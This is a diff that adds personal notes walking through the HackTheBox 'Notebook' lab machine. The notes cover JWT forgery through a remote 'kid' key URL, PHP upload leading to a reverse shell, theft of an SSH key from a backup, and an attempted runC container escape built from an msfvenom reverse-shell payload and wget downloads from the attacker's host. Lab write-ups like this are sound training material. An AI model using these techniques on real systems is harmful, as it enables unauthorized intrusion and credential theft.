@@ -1,0 +1,266 @@
+1. nmap scan shows ssh open on port 22 and a webserver running on 80 [details in nmap dir]
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: The Notebook - Your Note Keeper
+
+2. taking a look at the site on 80
+I can register a new user 
+- Looking at requests there is a JWT token getting passed around along with a UUID
+- details of the JWT token: 
+- There is no algorythim set 
+
+I can add a new note
+- testing for template injection with {{ '4'*4 }}"!@#$%^&()
+-- nothing happens as a result. 
+- testing for XSS with <b>testing</b>
+-- nothing happens as a result. 
+
+3. Focusing on the JWT and UUID
+- I know this is a JWT because it is three sets of base64 encoded 
+values seperated by a "." 
+- added this to a file called "jwt" 
+- breakdown: HEADER/HOW IT IS SIGNED.DATA.SIGNATURE
+- inspect it at https://jwt.io/
+
+Notes: 
+- Header looks very strange as it is using the RS256 algorythim
+- Payload contains "admin_cap" (perhaps capibility) set to 0
+- The signature requires the public and private key 
+
+Creating a new header with my IP 
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker]
+└─$ echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9 | base64 -d 
+{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}     
+
+I am going to replace the "kid" value with my IP 
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker]
+└─$ cat jwt.header 
+{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.16:7070/privKey.key"}
+
+Encode it with base64 
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker]
+└─$ base64 jwt.header -w 0
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNjo3MDcwL3ByaXZLZXkua2V5In0K  
+
+add the above to the header on jet.io to verify that it is what I expect. 
+
+Using the new JWT
+
+1. Send an existing request to repeater in burp. 
+2. Create a new listener on port 7070 as was indicated in the header
+3. Send a request with the modded jwt
+4. Verified that the jwt is now contacting my box for the priviate key 
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 7070
+listening on [any] 7070 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.230] 33318
+GET /privKey.key HTTP/1.1
+Host: 10.10.14.16:7070
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+4. Create my own private key 
+┌──(kali㉿kali)-[~]
+└─$ ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
+
+Public key is not formatted correctly so fixing that with openssl: 
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker/www]
+└─$ openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
+writing RSA key
+
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker/www]
+└─$ cat jwtRS256.key.pub 
+-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3uUyHN40+N3Kj4eGCMzq
+RH6FWrEK4XRgJXR7BG2ZzSG/7MJp5470tEgG2q/yJ41VFR0njaE7OkHvOa841QR1
+HgZL53dCPCEuTYH0b/XW9WcPSTbNSinVCS+UMYuRaXFd9xnfNt9XEidIEXP5/2F4
+RZOed0oUYWcuV2RZYQwV0nff+y2ao6/a9rvVzzSjf+vYm7XHhfrCMwjVsyKJd6jD
+A2J2R+dd8CJ3ttHYIcUe5iw7K/iVvhmXheCZ/3/VMFnS/NTzT3vrcSFE9CnU8snK
+szsEvN5OKBeESVEspon88rEjdi1pgsPAPccu+gv2urtT7XVDS0PraP7F0CXcXn4u
+GLmz7OV0JCL3Egkox//q5fIYs51cGobESrAJrZoDRc5bqjOy7QA642q5LCuQuT2B
+iILK53e9t6ifOxRhyI5DwIMBDa19F5OIaRDXul8MBvLj4sSWxlWZ73G58j/0YdvQ
+0P1vkGflASHVVBZ+3Tx8W0XctqcMqtyDgEwIaicl1QEaVmc3neHDeC8nvC/0+VR1
+PkukCXHULWFcNK6+fa/QafuyRu6pN1kepvd1yeNq/e5Nb4SleJj5wmFq319J10GL
+HRK32dItwxsz9/Kek8hI76kBZi4msrwvdi9z0zinh29HDf+0mMeY+Z3pR3Wr8j0w
+MtgStPNRWPxHKG41tRNr0Y0CAwEAAQ==
+-----END PUBLIC KEY-----
+
+Add both the priviate and public keys to the jwt.io token 
+
+signature is verified 
+
+Because the signature is verified I can now mod the payload and set admin to 1
+{
+  "username": "naughtron",
+  "email": "naughtron@email.org",
+  "admin_cap": 1
+}
+
+Create a link between the private key I generated and the expected privKey.key that the header is 
+requesting 
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker/www]
+└─$ ln -s jwtRS256.key privKey.key
+
+Start a simple http server
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker/www]
+└─$ python -m SimpleHTTPServer 7070                                                                                                                                    1 ⨯
+Serving HTTP on 0.0.0.0 port 7070 ...
+
+Go back into the borwser and swap the existing jwt with the new one. 
+
+Refresh the existing page and now I am admin. 
+
+5. Using the site as admin
+I am now allowed to upload a file 
+http://10.10.10.230/admin/upload
+
+Looking at notes from other users. 
+http://10.10.10.230/admin/viewnotes
+"Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server." - by admin
+
+also discover another user named noah
+
+6. Testing file execution
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker]
+└─$ cat echotest.php 
+<?php
+echo "Always Be Testing";
+?>
+
+The above works after upload and going to the file 
+
+I have verified code execution 
+
+Uploaded the standared php reverse shell 
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.230] 41030
+Linux thenotebook 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 18:24:07 up  4:14,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+www-data@thenotebook:/$ whoami
+www-data
+
+7. Enumerate the box
+A good way to know the date the box was created is to look at the ssh key dates
+These are located in: 
+www-data@thenotebook:/home/noah$ ls -la /etc/ssh/
+total 596
+...
+-rw-------  1 root root    411 Feb 12 06:25 ssh_host_ed25519_key
+-rw-r--r--  1 root root     98 Feb 12 06:25 ssh_host_ed25519_key.pub
+...
+
+Look for files created after this date by using: 
+
+find / -newermt "2021-02-12" ! -newermt "2021-02-19" -ls 
+
+This can also be made to ignore directories with 
+
+find / -newermt "2021-02-12" ! -newermt "2021-02-19" -ls 2>/dev/null | grep -v ' /etc\| /var\|.....' 
+
+This results in finding: 
+
+www-data@thenotebook:/var/backups$ ls -la
+...
+-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz
+
+8. Investigate the tar file 
+www-data@thenotebook:/var/backups$ cp home.tar.gz /tmp
+www-data@thenotebook:/var/backups$ cd /tmp/
+
+www-data@thenotebook:/tmp$ tar -zxvf home.tar.gz 
+home/
+home/noah/
+home/noah/.bash_logout
+home/noah/.cache/
+home/noah/.cache/motd.legal-displayed
+home/noah/.gnupg/
+home/noah/.gnupg/private-keys-v1.d/
+home/noah/.bashrc
+home/noah/.profile
+home/noah/.ssh/
+home/noah/.ssh/id_rsa <<<!!! ssh key for noah moved into creds dir as noah_ssh_key
+home/noah/.ssh/authorized_keys
+home/noah/.ssh/id_rsa.pub
+
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker/creds]
+└─$ mv noah_ssh_key noah_ssh.key
+
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker/creds]
+└─$ chmod 600 noah_ssh.key 
+
+┌──(kali㉿kali)-[~/education/CTF/HTB-notebook-jwt-and-docker/creds]
+└─$ ssh -i noah_ssh.key noah@10.10.10.230
+Last login: Wed Feb 24 09:09:34 2021 from 10.10.14.5
+noah@thenotebook:~$ 
+
+8. On box as noah
+check sudoers
+noah@thenotebook:~$ sudo -l
+Matching Defaults entries for noah on thenotebook:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User noah may run the following commands on thenotebook:
+    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+
+This user can exe a docker command
+
+Running the command. 
+
+9. Inside the docker container 
+Looking at create_db.py there are two passwords listed
+User(username='admin', email='admin@thenotebook.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"),
+User(username='noah', email='noah@thenotebook.local', uuid=noah_uuid, password="e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2")
+
+Looking at main.py there is a line 
+hasher = SHA3_256.new()
+
+Information about docker: 
+noah@thenotebook:~$ /usr/bin/docker -v
+Docker version 18.06.0-ce, build 0ffa825
+noah@thenotebook:~$ ls -la /usr/bin/docker
+-rwxr-xr-x 1 root root 38108056 Jul 18  2018 /usr/bin/docker
+
+This is an old version of docker. 
+Looking through CVEs this comes up 
+https://www.cvedetails.com/cve/CVE-2019-5736/
+Using this PoC 
+
+https://github.com/twistlock/RunC-CVE-2019-5736
+
+Creating my own shell with msfvenom 
+┌──(kali㉿kali)-[~/…/CTF/HTB-notebook-jwt-and-docker/RunC-CVE-2019-5736/exec_POC]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT-9002 -f elf -o new_runc    
+
+Pull the shell over with wget: 
+noah@thenotebook:~$ wget http://10.10.14.16:8000/new_runc
+
+run the docker contaitner again with sudo 
+noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 sh
+
+INSIDE THE CONTAINER 
+Pull over all the exploit files
+
+# wget 10.10.14.16:8000/new_runc
+# wget 10.10.14.16:8000/overwrite_runc
+# wget 10.10.14.16:8000/replace.sh
+# wget 10.10.14.16:8000/bash_evil
+
+# cp /bin/bash /bin/bash_origional
+# cp /bin/bash /bin/bash_original
+# chmod +x bash_evil over* repl* new*
+# cp bash_evil /bin/bash
+# ./replace.sh
+[+] Waiting for runC to be executed in the container...
+
+ssh in again with noah
+
+THIS WAS A DEAD END. 
